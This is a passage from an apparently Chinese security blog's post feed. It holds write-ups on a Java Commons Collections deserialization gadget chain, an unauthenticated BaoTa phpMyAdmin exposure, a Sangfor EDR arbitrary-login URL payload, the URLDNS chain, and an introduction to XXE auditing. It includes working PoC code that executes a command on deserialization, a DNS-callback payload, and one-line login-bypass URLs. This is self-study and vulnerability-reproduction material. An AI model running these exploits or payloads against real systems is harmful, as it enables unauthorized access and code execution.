class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> CommonCollections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.Transformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class="line"><span class="keyword">import</span> org.apache.commons.collections.map.TransformedMap;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.annotation.Retention;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.InvocationHandler;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.util.Map;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">CommonCollections1poc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//构造Transformer的小链式</span></span><br><span class="line">        Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line"></span><br><span class="line">                <span class="comment">//利用InvokerTransformer的反射功能，构造可以序列化的 java.lang.Class 的 Runtime，class对象</span></span><br><span class="line">                <span class="comment">//利用反射构造命令执行</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),</span></span><br><span class="line">                new InvokerTransformer("getMethod",</span><br><span class="line">                        new Class[]&#123;String.class, Class[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>,</span><br><span class="line">                        new Class[]&#123;Object.class, Object[].class&#125;,</span><br><span class="line">                        <span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>]&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,</span><br><span class="line">                        <span class="keyword">new</span> Class[]&#123;String<span class="class">.<span class="keyword">class</span>&#125;,</span></span><br><span class="line">                        new String[]&#123;"open -a Calculator"&#125;),</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">// 将transformers链式的串起来在transformerChain内部</span></span><br><span class="line">        Transformer transformerChain = <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        Map innerMap = <span class="keyword">new</span> HashMap();</span><br><span class="line">        innerMap.put(<span class="string">"value"</span>, <span class="string">"zeo"</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//绑定map到修饰器</span></span><br><span class="line">        Map outerMap = TransformedMap.decorate(innerMap, <span class="keyword">null</span>, transformerChain);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//反射获取AnnotationInvocationHandler，将内部的方法实例化他</span></span><br><span class="line">        Class clazz = Class.forName(<span class="string">"sun.reflect.annotation.AnnotationInvocationHandler"</span>);</span><br><span class="line">        Constructor construct = clazz.getDeclaredConstructor(Class<span class="class">.<span class="keyword">class</span>, <span class="title">Map</span>.<span class="title">class</span>)</span>;</span><br><span class="line">        construct.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        InvocationHandler handler = (InvocationHandler) construct.newInstance(Retention<span class="class">.<span class="keyword">class</span>, <span class="title">outerMap</span>)</span>;</span><br><span class="line"></span><br><span class="line">        <span class="comment">//序列化操作，讲上述构造的handler恶意的对象，序列化保存</span></span><br><span class="line">        ByteArrayOutputStream barr = <span class="keyword">new</span> ByteArrayOutputStream();</span><br><span class="line">        ObjectOutputStream oos = <span class="keyword">new</span> ObjectOutputStream(barr);</span><br><span class="line">        oos.writeObject(handler);</span><br><span class="line">        oos.close();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//没实际作用，就是打印看一下反序列化的数据</span></span><br><span class="line">        System.out.println(barr);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//触发反序列化操作，触发漏洞</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(barr.toByteArray()));</span><br><span class="line">        Object o = (Object) ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功执行：</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MjcxNDMwMzUucG5n?x-oss-process=image/format,png" alt="image-20200827143035470"></p><h1 id="0x07总结"><a href="#0x07总结" class="headerlink" title="0x07总结"></a>0x07总结</h1><p>​ 还是挺有意义的吧，了解底层的原来，还有一些类的原理没有摸透，得好好再看看。</p><p>​ 反射的基础还是挺重要的，得多学习。</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>宝塔 未授权访问漏洞</title>
      <link href="/2020/08/24/%E5%AE%9D%E5%A1%94%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/08/24/%E5%AE%9D%E5%A1%94%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x01-介绍"><a href="#0x01-介绍" class="headerlink" title="0x01 介绍"></a>0x01 介绍</h1><p>宝塔8.23日发布紧急更新提示。</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MjMyMDA5NTMucG5n?x-oss-process=image/format,png" alt="image-20200823200953264"></p><h1 id="0x02-影响范围"><a href="#0x02-影响范围" class="headerlink" title="0x02 影响范围"></a><strong>0x02 影响范围</strong></h1><p>宝塔linux面板 &lt; 7.4.2</p><p>宝塔windows面板 &lt; 6.8</p><p>并且安装了phpmyadmin</p><h1 id="0x03-漏洞详情"><a href="#0x03-漏洞详情" class="headerlink" title="0x03:漏洞详情"></a><strong>0x03:漏洞详情</strong></h1><p>phpmyadmin没有加权限，直接未授权访问，直接查询数据库，从而拿到整站数据</p><p>利用：</p><p>ip:888/pma</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MjQwMTEwMjYucG5n?x-oss-process=image/format,png" alt="image-20200824011026545"></p><h1 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h1><ul><li>升级到宝塔最新版</li></ul>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>某信服-SANGFOR终端检测响应平台 - 任意用户登录 0day</title>
      <link href="/2020/08/20/%E6%9F%90%E4%BF%A1%E6%9C%8D-SANGFOR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0%20-%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%200day/"/>
      <url>/2020/08/20/%E6%9F%90%E4%BF%A1%E6%9C%8D-SANGFOR%E7%BB%88%E7%AB%AF%E6%A3%80%E6%B5%8B%E5%93%8D%E5%BA%94%E5%B9%B3%E5%8F%B0%20-%20%E4%BB%BB%E6%84%8F%E7%94%A8%E6%88%B7%E7%99%BB%E5%BD%95%200day/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h1><p>平台版本号：&lt; 3.2.19</p><h1 id="0x02-漏洞利用"><a href="#0x02-漏洞利用" class="headerlink" title="0x02 漏洞利用"></a>0x02 漏洞利用</h1><p>payload: <a href="https://ip/ui/login.php\?user=admin" target="_blank" rel="noopener">https://ip/ui/login.php\?user=admin</a></p><p>例如: <a href="https://127.0.0.1:5000/ui/login.php\?user=admin" target="_blank" rel="noopener">https://127.0.0.1:5000/ui/login.php\?user=admin</a></p><p>成功利用</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MjAwOTM2MTkucG5n?x-oss-process=image/format,png" alt="image-20200820093619309"></p><p>参考文章：</p><p><a href="https://www.yuque.com/pmiaowu/hcy2bz/fp4icw\?from=groupmessage" target="_blank" rel="noopener">https://www.yuque.com/pmiaowu/hcy2bz/fp4icw\?from=groupmessage</a></p>]]></content>
      
      
      <categories>
          
          <category> WEB漏洞复现和分析 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计：Java反序列化入门之URLDNS链</title>
      <link href="/2020/08/19/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9AJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8BURLDNS%E9%93%BE/"/>
      <url>/2020/08/19/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9AJava%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%85%A5%E9%97%A8%E4%B9%8BURLDNS%E9%93%BE/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>自学Java 代码审计，主要自己一个人学习，有点闭门造车，搜索引擎学习法，但是还是记录一下，也分享一下，也便于将来的总结和反思，如果我能终能学到什么，我也会重新梳理思路，为那些自学者提供一个好的思路，所以有了下面的系列文章java代码审计自学篇。</p><p>之前研究了，但是没有整理好，因为有hvv任务，所以推迟了一些，现在赶紧整理发出来。</p><h1 id="0x01-Java反序列化介绍"><a href="#0x01-Java反序列化介绍" class="headerlink" title="0x01 Java反序列化介绍"></a>0x01 Java反序列化介绍</h1><p><strong>Java反序列化漏洞的产生原因：</strong></p><p>简单的说就是，在于开发者在重写 <strong>readObject</strong> 方法的时候，写入了漏洞代码。</p><p><strong>序列化和反序列化本身并不存在问题</strong></p><p>但当输入的反序列化的数据可被用户控制，那么攻击者即可通过构造恶意输入，让反序列化产生非预期的对象，在此过程中执行构造的任意代码。</p><h1 id="0x02-反序列化方法的对比"><a href="#0x02-反序列化方法的对比" class="headerlink" title="0x02 反序列化方法的对比"></a>0x02 反序列化方法的对比</h1><p>在接触Java反序列化之前，就是PHP了，PHP的反序列化和着还是有区别的</p><ul><li><p>他们最基本的原理是类似的，反复横跳，找到一个利用链。</p></li><li><p>都是用于数据存储的一个格式化的操作。</p></li><li><p>将一个对象中的属性按照某种特定的格式生成一段数据流，在反序列化的时候再按照这个格式将属性拿回来，还原成对象。</p></li><li><p>而Java其提供了更加高级的writeObject ，允许在序列化流中插入一些自定义数据，进而在反序列化的时候能够使用 readObject 进行读</p></li></ul><h2 id="0x021-PHP反序列化"><a href="#0x021-PHP反序列化" class="headerlink" title="0x021 PHP反序列化"></a>0x021 PHP反序列化</h2><ul><li>我们熟悉的都是那些魔术方法，去触发魔术方法，构造pop链。</li><li>wakeup 魔术方法的目的就是在序列化、反序列化的前后执行一些操作。</li><li>PHP的序列化、反序列化是低层过程，PHP的序列化是开发者是不能操作的。</li><li>开发者调用 serialize 函数后，序列化的数据就已经完成。</li><li>魔术方法只是在序列化前后对这个对象的操作。</li></ul><h2 id="0x022-JAVA反序列化"><a href="#0x022-JAVA反序列化" class="headerlink" title="0x022 JAVA反序列化"></a>0x022 JAVA反序列化</h2><ul><li>Java在序列化时一个对象，就不一样了，Java是在序列化的中间，去触发一下利用链，而不是php在序列化完成后</li><li>Java在序列化时，将会调用这个对象中的 writeObject 方法</li><li>反序列化时，会调用readObject</li><li>writeObject和readObject 方法开发者多种情况都是自己会重写，造成一些问题，构造触发链。</li></ul><h1 id="0x03-ysoserial-介绍"><a href="#0x03-ysoserial-介绍" class="headerlink" title="0x03 ysoserial 介绍"></a>0x03 ysoserial 介绍</h1><ul><li><p>15年的Apache Commons Collections 反序列化远程命令执行漏洞 (ysoserial 的最早的 commit ）</p></li><li><p>同时无数 Java 应用系统各种rce疯狂爆出</p></li><li><p>反序列化漏洞利⽤⼀个⾥程碑式的⼯具，ysoserial。</p></li><li><p>最开始我都以为，这是一个特定的利用工具，后来发现，为啥好多漏洞都用这个，才知道这是一个通用的工具。</p></li><li><p>ysoserial集合了各种java反序列化payload，它可以⾃⼰选择的利⽤链，⽣成反序列化利⽤数据，通过将这些数据发送给⽬标，从⽽执⾏命令。</p></li></ul><h1 id="0x04-URLDNS-原理"><a href="#0x04-URLDNS-原理" class="headerlink" title="0x04 URLDNS 原理"></a>0x04 URLDNS 原理</h1><p>这个是ysoserial中最简单的一条利用链了，也常常作为检测反序列化的功能，URLDNS这个pop链的大概的工作原理：</p><p>1、 java.util.HashMap重写了readObject方法：</p><p>​ 在反序列化时会调用 hash 函数计算 key 的 hashCode</p><p>2、java.net.URL对象的 hashCode 在计算时会调用 getHostAddress 方法</p><p>3、getHostAddress方法从而解析域名发出 DNS 请求</p><h1 id="0x05-构建漏洞代码"><a href="#0x05-构建漏洞代码" class="headerlink" title="0x05 构建漏洞代码"></a>0x05 构建漏洞代码</h1><p><a href="https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java" target="_blank" rel="noopener">https://github.com/frohoff/ysoserial/blob/master/src/main/java/ysoserial/payloads/URLDNS.java</a></p><p>ysoserial生成的代码，原理是一样的，下面是参考原理改写的一段，自己调试学习</p><p>反序列化的第一步，你得接受对象，然后反序列化吧</p><p>那么我们采用本地写一个序列号数据测试</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNS</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//漏洞出发点 hashmap，实例化出来</span></span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//URL对象传入自己测试的dnslog</span></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">"http://40zkzk.dnslog.cn"</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//反射获取 URL的hashcode方法</span></span><br><span class="line">        Field f = Class.forName(<span class="string">"java.net.URL"</span>).getDeclaredField(<span class="string">"hashCode"</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">//使用内部方法</span></span><br><span class="line">        f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// put 一个值的时候就不会去查询 DNS，避免和刚刚混淆</span></span><br><span class="line">        f.set(url, <span class="number">0xdeadbeef</span>); </span><br><span class="line">        hashMap.put(url, <span class="string">"zeo"</span>);</span><br><span class="line">      </span><br><span class="line">      <span class="comment">// hashCode 这个属性放进去后设回 -1, 这样在反序列化时就会重新计算 hashCode</span></span><br><span class="line">        f.set(url, -<span class="number">1</span>); </span><br><span class="line"></span><br><span class="line">      <span class="comment">//序列化成对象，输出出来</span></span><br><span class="line">        ObjectOutputStream objos = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(<span class="string">"./out.bin"</span>));</span><br><span class="line">        objos.writeObject(hashMap);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>随后，开始反序列化，触发漏洞</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">test</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">      <span class="comment">//读取目标</span></span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(<span class="string">"./out.bin"</span>));</span><br><span class="line">      <span class="comment">//反序列化</span></span><br><span class="line">        ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="触发"><a href="#触发" class="headerlink" title="触发"></a>触发</h2><p>先运行第一个，生产序列化数据</p><p>再运行第二个，反序列化触发漏洞</p><p>最后收到dnslog</p><p>注意：每次换DNSLOG的时候，都有重新生产序列化数据</p><h1 id="0x06-代码分析"><a href="#0x06-代码分析" class="headerlink" title="0x06 代码分析"></a>0x06 代码分析</h1><p>先看一下利用连，熟悉一下路径</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">HashMap-&gt;readObject() 反序列化点触发</span><br><span class="line">HashMap-&gt;hash()</span><br><span class="line">URL-&gt;hashCode()</span><br><span class="line">URLStreamHandler-&gt;hashCode()</span><br><span class="line">URLStreamHandler-&gt;getHostAddress() 发出解析请求</span><br></pre></td></tr></table></figure><p>梦开始的地方是HashMap 类</p><p>我们前⾯说了，触发反序列化的⽅法是 readObject</p><p>找到HashMap 类的 readObject ⽅法</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTgxNDM4MTEucG5n?x-oss-process=image/format,png" alt="image-20200818143811433"></p><p>触发点在 1413行的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br></pre></td></tr></table></figure><p>然后就是，其中的第一个参数 hash(key) 方法</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">   <span class="keyword">int</span> h;</span><br><span class="line">   <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里就是换对象了，这里的key肯定不是null，那么就会触发 key.hashCode()</p><p>这里使⽤的这个key是⼀个 java.net.URL 对象，我们看看其 hashCode ⽅法。</p><p>[外链图片转存失败,源站可能有防盗链机制,建议将图片保存下来直接上传(img-b3LQziqw-1597834189373)(/Users/zy/Library/Application Support/typora-user-images/image-20200813212359358.png)]</p><p>URL对象再次跟入 继续跟进其 hashCode ⽅法</p><p>359行 getHostAddress 方法传入了 DNSLOG地址</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTMyMTI1MTIucG5n?x-oss-process=image/format,png" alt="image-20200813212512006"></p><p>再跟入，其实就是442行，直接一句发出请求了</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTgxNDQ4NTEucG5n?x-oss-process=image/format,png" alt="image-20200818144851112"></p><p>现在运行前</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTMyMTI2MjkucG5n?x-oss-process=image/format,png" alt="image-20200813212629442"></p><p>这剧请求了URL，发出了请求</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTMyMTI3MDYucG5n?x-oss-process=image/format,png" alt="image-20200813212706551"></p><p>收到DNS请求，成功触发URLDNS整个功能</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTgxMzUzMDUucG5n?x-oss-process=image/format,png" alt="image-20200818135305115"></p><h1 id="0x07-坑点："><a href="#0x07-坑点：" class="headerlink" title="0x07 坑点："></a>0x07 坑点：</h1><p>新手第一次调试，总找不到触发点，还以为不在这，尤其是这个地方</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTgxNDU1MzQucG5n?x-oss-process=image/format,png" alt="image-20200818145534883"></p><p>这里有好几个对象, 要循环好几次，所以要找到 URL对象，再步入参数的hash函数</p><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly9naXRlZS5jb20vZ29kemVvL2Jsb2dpbWcvcmF3L21hc3Rlci9pbWcvMjAyMDA4MTgxNDU4NTEucG5n?x-oss-process=image/format,png" alt="image-20200818145851784"></p><h1 id="0x07-参考"><a href="#0x07-参考" class="headerlink" title="0x07 参考"></a>0x07 参考</h1><p><a href="https://xz.aliyun.com/t/7157#toc-0" target="_blank" rel="noopener">https://xz.aliyun.com/t/7157#toc-0</a></p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java代码审计：XXE漏洞</title>
      <link href="/2020/08/19/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9AXXE%E6%BC%8F%E6%B4%9E/"/>
      <url>/2020/08/19/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%EF%BC%9AXXE%E6%BC%8F%E6%B4%9E/</url>
      
        <content type="html"><![CDATA[<a id="more"></a><h1 id="0x00-前提"><a href="#0x00-前提" class="headerlink" title="0x00 前提"></a>0x00 前提</h1><p>Java 代码审计自学：主要自己一个人学习，有点闭门造车，搜索引擎学习法，但是还是记录一下，也分享一下，也便于将来的总结和反思，如果我能终能学到什么，我也会重新梳理思路，为那些自学者提供一个好的思路，所以有了下面的系列文章java代码审计自学篇。</p><h1 id="0x01-XXE漏洞简介"><a href="#0x01-XXE漏洞简介" class="headerlink" title="0x01 XXE漏洞简介"></a>0x01 XXE漏洞简介</h1><p>XXE（XML外部实体注入，XML External Entity) ，在应用程序解析XML输入时，当允许引用外部实体时，可构造恶意内容，导致读取任意文件、探测内网端口、攻击内网网站、发起DoS拒绝服务攻击、执行系统命令等。Java中的XXE支持sun.net.<a href="http://www.protocol" target="_blank" rel="noopener">www.protocol</a> 里的所有协议：http，https，file，ftp，mailto，jar，netdoc。一般利用file协议读取文件，利用http协议探测内网，没有回显时可组合利用file协议和ftp协议来读取文件。</p><h1 id="0x02-XXE相关基础概念"><a href="#0x02-XXE相关基础概念" class="headerlink" title="0x02 XXE相关基础概念"></a>0x02 XXE相关基础概念</h1><h2 id="XML-amp-DTD"><a href="#XML-amp-DTD" class="headerlink" title="XML&amp;DTD"></a>XML&amp;DTD</h2><p>XML （可扩展标记语言，EXtensible Markup Language），是一种标记语言，用来传输和存储数据，而非显示数据。<br>DTD（文档类型定义，Document Type Definition）的作用是定义 XML 文档的合法构建模块。它使用一系列的合法元素来定义文档结构。</p><h2 id="实体ENTITY"><a href="#实体ENTITY" class="headerlink" title="实体ENTITY"></a>实体ENTITY</h2><p>XML中的实体类型，一般有下面几种：字符实体、命名实体（或内部实体）、外部普通实体、外部参数实体。除外部参数实体外，其它实体都以字符（&amp;）开始，以字符（;）结束。</p><h1 id="0x03-XXE审计函数"><a href="#0x03-XXE审计函数" class="headerlink" title="0x03 XXE审计函数"></a>0x03 XXE审计函数</h1><p>XML解析一般在导入配置、数据传输接口等场景可能会用到，涉及到XML文件处理的场景可查看XML解析器是否禁用外部实体，从而判断是否存在XXE。部分XML解析接口如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">javax.xml.parsers.DocumentBuilderFactory;</span><br><span class="line">javax.xml.parsers.SAXParser</span><br><span class="line">javax.xml.transform.TransformerFactory</span><br><span class="line">javax.xml.validation.Validator</span><br><span class="line">javax.xml.validation.SchemaFactory</span><br><span class="line">javax.xml.transform.sax.SAXTransformerFactory</span><br><span class="line">javax.xml.transform.sax.SAXSource</span><br><span class="line">org.xml.sax.XMLReader</span><br><span class="line">org.xml.sax.helpers.XMLReaderFactory</span><br><span class="line">org.dom4j.io.SAXReader</span><br><span class="line">org.jdom.input.SAXBuilder</span><br><span class="line">org.jdom2.input.SAXBuilder</span><br><span class="line">javax.xml.bind.Unmarshaller</span><br><span class="line">javax.xml.xpath.XpathExpression</span><br><span class="line">javax.xml.stream.XMLStreamReader</span><br><span class="line">org.apache.commons.digester3.Digester</span><br></pre></td></tr></table></figure><h1 id="0x04-漏洞代码例子"><a href="#0x04-漏洞代码例子" class="headerlink" title="0x04 漏洞代码例子"></a>0x04 漏洞代码例子</h1><p>使用spring boot框架写的小例子</p><p>询问一个常用的解析方法，选择一个有回显的方法，方便学习</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 